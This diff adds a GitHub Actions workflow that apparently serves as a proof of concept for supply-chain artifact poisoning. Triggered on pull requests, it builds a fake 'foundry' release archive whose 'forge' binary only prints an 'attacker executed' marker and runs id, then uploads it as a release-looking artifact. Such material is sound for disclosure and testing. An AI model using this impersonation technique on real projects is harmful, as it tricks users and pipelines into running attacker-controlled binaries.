@@ -1,0 +1,24 @@
+name: npm-poc-release
+on:
+  pull_request:
+
+permissions: {}
+
+jobs:
+  fake-release:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Craft attacker-controlled "foundry" release archive
+        run: |
+          set -euo pipefail
+          mkdir -p out
+          printf '#!/bin/sh\necho ATTACKER_BINARY_EXECUTED\nid\n' > out/forge
+          chmod +x out/forge
+          tar -czvf foundry_9.9.9_linux_amd64.tar.gz -C out forge
+          sha256sum foundry_9.9.9_linux_amd64.tar.gz
+
+      - name: Upload it as a release-looking artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: foundry_9.9.9_linux_amd64.tar.gz
+          path: foundry_9.9.9_linux_amd64.tar.gz
